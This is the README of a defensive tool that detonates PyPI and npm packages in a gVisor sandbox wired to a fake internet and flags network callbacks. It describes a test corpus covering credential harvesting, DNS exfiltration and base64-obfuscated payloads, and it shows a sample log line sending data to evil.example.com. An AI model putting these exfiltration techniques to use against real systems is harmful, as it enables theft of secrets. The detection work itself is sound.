# pkgids — Behavioral Package Detonation Rig

pkgids is a dynamic malware-detection tool for open-source packages. It downloads a package from PyPI or npm, detonates it inside a gVisor-isolated sandbox wired to a fake internet that captures all network behavior while blocking real egress, and flags packages that phone home or behave maliciously at install or import time. The core differentiator over static source-code analysis (SCA) tools is behavioral, network-level detection: pkgids catches obfuscated payloads that evade grep-based or AST-based scanning by executing them in a contained environment and watching what they actually do.

---

## Motivation

Open-source supply-chain attacks via malicious packages are a growing threat. Attackers publish packages with names similar to popular libraries (typosquatting), inject malicious versions of legitimate packages, or social-engineer maintainers. The payload typically executes at install time (`setup.py`, `package.json` scripts) or at first import, before most users have any reason to be suspicious.

Static tools can catch obvious red flags (use of `subprocess`, `os.system`, known-bad URLs), but real malware consistently evades them through base64 encoding, multi-stage payloads, and dynamic URL construction. By contrast, pkgids runs the package and watches what network connections it attempts.

**An empirical finding from this project:** in a sample of 100 documented malicious PyPI packages pulled from the [OpenSSF malicious-packages dataset](https://github.com/ossf/malicious-packages), **all 100 had already been removed from PyPI** by the time of the query. The registry catch-up time is non-zero. A real-time, pre-installation behavioral detector is the only way to protect users who encounter a package before the registry reacts.

---

## Validated Results

pkgids was validated against a self-authored labeled corpus of 7 samples (6 distinct malicious techniques + 1 benign control), each built as a local PyPI sdist and detonated through the full pipeline.

| Sample | Technique | Expected | Result |
|---|---|---|---|
| `canary-http-install` | `urllib` GET in `setup.py` | malicious | **TP** |
| `canary-dns-exfil` | base32-encoded subdomain DNS lookup | malicious | **TP** |
| `canary-env-harvest` | reads env + `~/.ssh/id_rsa` length → GET | malicious | **TP** |
| `canary-subprocess` | spawns `python3 -c "urlopen(...)"` | malicious | **TP** |
| `canary-base64-blob` | `exec(base64.b64decode(_BLOB))` → GET | malicious | **TP** |
| `canary-import-callback` | callback only in `__init__.py` | malicious | **FN** ⚠ |
| `benign-clean-control` | does nothing | benign | **TN** |

**Detection rate: 83.3% (5/6). False-positive rate: 0%.**

The one false negative (`canary-import-callback`) is a known architectural limitation (see [Limitations](#limitations--future-work)). Notably, the base64-obfuscated payload — the kind that defeats source scanners — was detected, demonstrating that behavioral analysis works where static analysis does not.

> All corpus samples target `canary-test.example.com` (unreachable on the real internet) and do no actual harm. They exist solely to measure detection capability.

---

## Architecture

See [architecture.md](architecture.md) for the full system diagram.

```
  fetch.py         dataset.py          validate.py
(download only)  (OpenSSF metadata)  (labeled corpus run)
      │
      ▼
┌──────────────────────────────────────────────────────────┐
│  Contained detonation  (capture.py + sandbox.py)         │
│  gVisor runsc · internal network · no real egress        │
│                                                          │
│  ┌─────────────────────┐    phones home    ┌──────────── │
│  │  Sandbox container  │ ────────────────► │  Fake-inet  │
│  │  install → import   │                   │  appliance  │
│  │  non-root (deton)   │                   │  DNS + TCP  │
│  │  resolv.conf→appl.  │                   │  JSONL log  │
│  └─────────────────────┘                   └──────────── │
│  ┌─────────────────────┐   ┌─────────────────────────── │
│  │  tcpdump on bridge  │   │  Per-phase attribution      │
│  │  capture.pcap       │   │  timestamp-window filter    │
│  └─────────────────────┘   └─────────────────────────── │
└──────────────────────────────────────────────────────────┘
      │
      ▼
┌──────────────────────────────────────────────────────────┐
│  Verdict  (run.json)                                     │
│  network_activity → malicious / benign                   │
│  83.3% detection · 0% false-positive rate                │
└──────────────────────────────────────────────────────────┘
```

### Pipeline stages

1. **Fetch** — `fetch.py` downloads the package artifact from PyPI or npm, verifies the SHA-256 / SRI integrity digest, and writes a `metadata.json` (upload time, maintainers, file list, install-hook presence). Nothing is executed on the host.

2. **tcpdump** — `capture.py` determines the Linux bridge interface for `detonet` (`br-<network-id[:12]>`) and starts `tcpdump -w capture.pcap` on it. Runs on the host, best-effort.

3. **Install phase** — `sandbox.py` calls `docker run --runtime runsc` with `--network detonet`, resource caps, and a custom `resolv.conf` pointing to the appliance. The sandbox runs `pip3 install --break-system-packages --no-build-isolation --no-deps /work/<artifact>` (or `npm install` for npm). Stdout/stderr/exit code and duration are recorded to `install.json`.

4. **Import phase** — a second, fresh container runs `python3 -c "import <module>"` (or `node -e "require('<name>')"`) in the same network. Records to `import.json`. Best-effort: the package is not present in this container, so import-only payloads are not caught (see [Limitations](#limitations--future-work)).

5. **Stop tcpdump** — pcap file is flushed.

6. **Per-phase attribution** — each sandbox call is bracketed by `time.time()` snapshots (`[t_start, t_end]`). `_read_phase_entries()` reads the appliance's JSONL log and keeps only entries whose `ts` field falls within the window. **Stale entries from IP recycling are excluded.** This was the fix for a false-positive bug where a previous run's traffic was attributed to a benign package.

7. **Verdict** — `run.json` records exit codes, durations, per-phase `network_activity` booleans, and paths to all output files. Prediction rule: `malicious` if any phase has `network_activity=True` OR the install phase timed out; `benign` otherwise.

---

## Safety / Containment Model

| Layer | Mechanism | Why |
|---|---|---|
| Kernel isolation | gVisor `--runtime runsc` | Intercepts syscalls before they reach the host kernel; a compromised package cannot exploit kernel CVEs |
| Network isolation | `--network detonet` (`--internal` bridge) | Docker's iptables rules drop all forwarded packets; no real internet is reachable |
| DNS spoofing | `resolv.conf` bind-mounted to point at appliance | Under gVisor, Docker's embedded resolver (127.0.0.11) does not function; mounting our own file routes all DNS to the appliance |
| Fake internet | `pkgids-fakeinternet` appliance | Accepts connections and logs them instead of forwarding; the package thinks it reached the internet |
| Non-root execution | `--user deton` inside container | Limits damage from container-escape attempts |
| Memory cap | `--memory 1g` | Prevents OOM attacks on the host |
| CPU cap | `--cpus 1.0` | Prevents CPU exhaustion |
| PID limit | `--pids-limit 256` | Prevents fork bombs |
| Wall-clock timeout | 120 s default (`sandbox.timeout_secs`) | Process-killed if exceeded; `timed_out=true` in results |
| Ephemeral containers | `docker rm -f` in `finally` | Container is removed even on timeout or exception; no state persists |
| Read-only workdir | `--mount type=bind,...,readonly` | Artifact is visible inside the container but cannot be modified |
| Writable scratch | `--mount type=tmpfs,target=/scratch` | In-memory scratch space; evaporates on container exit |

---

## Components

| File | Role |
|---|---|
| `pkgids/fetch.py` | Downloads PyPI (prefers sdist, falls back to wheel) and npm (tarball) artifacts. Verifies SHA-256 (PyPI) or SRI `sha512-` hash (npm). Writes `metadata.json` with upload timestamp, maintainers, archive member list, and install-hook detection. Never executes anything. |
| `pkgids/sandbox.py` | Wraps `docker run --runtime runsc`. Manages the resolv.conf temp file (gVisor DNS fix), per-run unique container names, IP polling after startup (to get the detonet IP before the container exits and Docker clears `NetworkSettings`), resource limits, and guaranteed cleanup via `finally`. |
| `pkgids/capture.py` | Pipeline orchestrator. Fetches (or uses a local artifact), starts tcpdump, runs install + import phases, collects timestamp-windowed appliance logs, and writes `install.json`, `import.json`, `network.jsonl`, and `run.json`. |
| `pkgids/validate.py` | Reads a labeled CSV, runs `capture.run()` for each sample (skipping already-completed rows for resumability), computes TP/FP/TN/FN and detection / FP rates. Supports `--local-artifacts` for corpus validation from local sdists. |
| `pkgids/dataset.py` | Fetches malicious-package records from the [OpenSSF malicious-packages](https://github.com/ossf/malicious-packages) repository via the GitHub Contents API. Returns `{ecosystem, name, version, osv_id, summary}` dicts. Results are cached to `data/malicious_<ecosystem>.json`. |
| `pkgids/analyze.py` | Stub — future static/dynamic analysis of captured events. |
| `pkgids/score.py` | Stub — future numeric scoring model. |
| `pkgids/report.py` | Stub — future structured reporting. |
| `infra/fakeinternet/responder.py` | Pure-stdlib Python. DNS server (UDP 53) that resolves every hostname to itself. TCP listeners on ports 21, 25, 80, 443, 8080. Extracts HTTP `Host` header + request line, TLS SNI, SMTP/FTP banners. Writes JSONL to `/logs/<src_ip>.jsonl`. |

---

## Usage

### Prerequisites

- **Linux** with Docker and [gVisor](https://gvisor.dev/docs/user_guide/install/) (`runsc` runtime registered with Docker)
- Python 3.11+

### Install

```bash
git clone https://github.com/Yashcshah/pkgids.git
cd pkgids
python -m venv .venv && source .venv/bin/activate
pip install -e .
```

### Build the sandbox image

```bash
make sandbox-image          # builds pkgids-sandbox:latest from Dockerfile.sandbox
```

### Start the fake-internet appliance

```bash
make detonet                # creates the isolated Docker bridge (10.200.200.0/24)
make fakeinternet-start     # builds + starts pkgids-fakeinternet on detonet
```

### Core commands

**Download a package without running anything:**
```bash
pkgids fetch pypi requests 2.31.0
pkgids fetch npm lodash 4.17.21
```

**Detonate a package through the full pipeline:**
```bash
pkgids detonate pypi requests 2.31.0
pkgids detonate npm lodash 4.17.21 --skip-import
pkgids detonate pypi six 1.16.0 --run-dir /tmp/six-run
```

Output is `run.json` in `runs/<timestamp>-<ecosystem>-<name>-<version>/`.

**Browse the OpenSSF malicious-packages dataset (no execution):**
```bash
pkgids dataset fetch pypi --limit 20
pkgids dataset fetch npm --limit 50 --token $GITHUB_TOKEN
```

**Validate against a labeled CSV:**
```bash
# Against live registry packages:
pkgids validate --samples data/benign_samples.csv

# Against locally-built corpus sdists:
bash corpus/build_all.sh
pkgids validate --samples data/corpus_samples.csv --local-artifacts
```

Validation is resumable: samples already in `data/validation_results.json` are skipped.

### Demo: confirm fake-internet capture works

```bash
make demo-fake              # runs DNS + HTTP canary, prints capture log, confirms no real egress
```

---

## Output Files

Each `pkgids detonate` run creates a directory under `runs/`:

```
runs/20240621T120000Z-pypi-six-1.16.0/
  install.json     # command, stdout, stderr, exit_code, duration, window [t0,t1]
  import.json      # same for import phase
  network.jsonl    # timestamp-filtered fakeinternet entries for this run only
  capture.pcap     # tcpdump on detonet bridge (requires host root; skipped if unavailable)
  run.json         # summary: phases, network_activity per phase, paths to all outputs
```

`network.jsonl` entries look like:
```json
{"ts": 1719000001.23, "type": "dns",  "src": "10.200.200.3", "query": "evil.example.com", "resolved_to": "10.200.200.2"}
{"ts": 1719000001.31, "type": "tcp",  "src": "10.200.200.3", "dst_port": 80, "protocol": "http", "host": "evil.example.com", "request_line": "GET /steal?data=secret HTTP/1.1"}
```

---

## Configuration

All knobs live in `config.toml`:

```toml
[sandbox]
image        = "pkgids-sandbox:latest"
runtime      = "runsc"          # gVisor; set to "runc" to disable on machines without gVisor
timeout_secs = 120
memory       = "1g"
cpus         = 1.0
pids_limit   = 256

[fakeinternet]
network        = "detonet"
subnet         = "10.200.200.0/24"
container_name = "pkgids-fakeinternet"
ip             = "10.200.200.2"
logs_dir       = "logs/fakeinternet"

[detonation]
runs_dir            = "runs"
skip_import         = false
clear_logs_each_run = true      # truncate appliance logs before each run to prevent stale entries
```

---

## Corpus

`corpus/` contains seven self-authored sample packages. Each is a buildable PyPI sdist demonstrating one malware technique. All targets are `canary-test.example.com` (fake sink; unreachable on the real internet).

```bash
bash corpus/build_all.sh   # builds sdists into corpus/dist/, writes data/corpus_samples.csv
```

The build script uses a before/after glob diff to find the actual `.tar.gz` name regardless of how setuptools normalizes it (hyphens vs. underscores).

---

## Limitations & Future Work

**Known false negative — import-time callbacks.** `canary-import-callback` puts its payload in `__init__.py`. pkgids runs install and import in separate containers. The import container is fresh (package not installed), so `import canary_import_callback` fails with `ModuleNotFoundError` and the callback never fires. Catching import-time payloads requires a combined install+import test inside a single container. This is the one missed case in the corpus (1/6 = 16.7% miss rate for this specific technique; 0% miss rate for install-time techniques).

**Supported ecosystems.** Deep support (sdist/wheel preference, SHA-256 integrity, metadata.json) exists for PyPI and npm. Other ecosystems (RubyGems, crates.io, Maven) are not supported.

**Prediction rule is simple.** The current heuristic is: `network_activity=True` → malicious, install timeout → malicious, else benign. There is no scoring model, no Zeek-based protocol analysis, and no static feature extraction beyond the archive member list. `analyze.py` and `score.py` are stubs for future work.

**No live feed.** The tool is driven by explicit `pkgids detonate` or `pkgids validate` calls. Integration with a real-time package-publication feed (e.g., PyPI's RSS or BigQuery events) is not implemented.

**tcpdump requires host root.** The pcap capture uses `tcpdump` on the host bridge interface; this is skipped with a warning if the host user lacks the necessary capability. The JSONL appliance log is always written regardless.

**gVisor must be installed.** The sandbox requires `--runtime runsc`. On machines without gVisor, set `runtime = "runc"` in `config.toml`; this removes kernel-level isolation but preserves all other containment layers.

---

## Responsible Use

- **Do not detonate packages outside the contained rig.** The appliance and `--internal` network ensure no real internet calls are made, but this guarantee depends on Docker and gVisor being correctly configured.
- **Do not redistribute malicious artifacts.** The `artifacts/`, `runs/`, and `corpus/dist/` directories are gitignored precisely because they may contain malicious code.
- **The corpus samples are safety-research packages.** They target a non-existent domain and do no harm, but they execute real network code. Treat them accordingly.

---

## Running Tests

```bash
# Unit and integration tests (no Docker needed for most):
pytest -v

# Docker-dependent tests are marked requires_sandbox and skip automatically
# if the sandbox image or fakeinternet container is not running.
```

143 unit tests pass without Docker. 17 Docker-dependent tests are automatically skipped when the environment is not configured.
